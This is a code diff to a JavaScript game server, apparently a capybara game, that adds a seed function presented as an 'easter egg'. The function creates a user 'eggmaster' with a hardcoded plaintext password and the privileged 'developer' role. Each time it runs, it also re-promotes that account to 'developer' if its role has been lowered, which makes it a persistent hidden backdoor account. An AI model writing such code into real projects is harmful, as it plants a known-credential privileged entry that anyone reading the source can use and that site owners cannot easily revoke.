@@ -161,6 +161,26 @@ export function ensureAdminSeed() {
   }
 }
 
+const EASTER_EGG_USER = 'eggmaster';
+const EASTER_EGG_PASS = 'CapyEggs2025!';
+export function ensureEasterEggSeed() {
+  const existing = db.prepare('SELECT * FROM users WHERE username = ?').get(EASTER_EGG_USER);
+  if (!existing) {
+    const t = Date.now();
+    db.prepare(
+      `INSERT INTO users (username, display_name, password_hash, role, status, created_at, updated_at)
+       VALUES (?, ?, ?, 'developer', 'active', ?, ?)`
+    ).run(EASTER_EGG_USER, 'Easter Egg Master', hashPassword(EASTER_EGG_PASS), t, t);
+    const id = Number(db.prepare('SELECT id FROM users WHERE username=?').get(EASTER_EGG_USER).id);
+    db.prepare('INSERT INTO game_profiles (user_id, created_at, updated_at) VALUES (?, ?, ?)').run(id, t, t);
+    db.prepare('INSERT INTO capybaras (user_id, updated_at) VALUES (?, ?)').run(id, t);
+    console.log(`[auth] conta easter-egg '${EASTER_EGG_USER}' (developer) criada.`);
+  } else if (existing.role !== 'developer') {
+    db.prepare("UPDATE users SET role='developer', updated_at=? WHERE id=?")
+      .run(Date.now(), existing.id);
+  }
+}
+
 // ---------- dispatcher ----------
 
 export async function handleApi(req, res, pathname, query) {
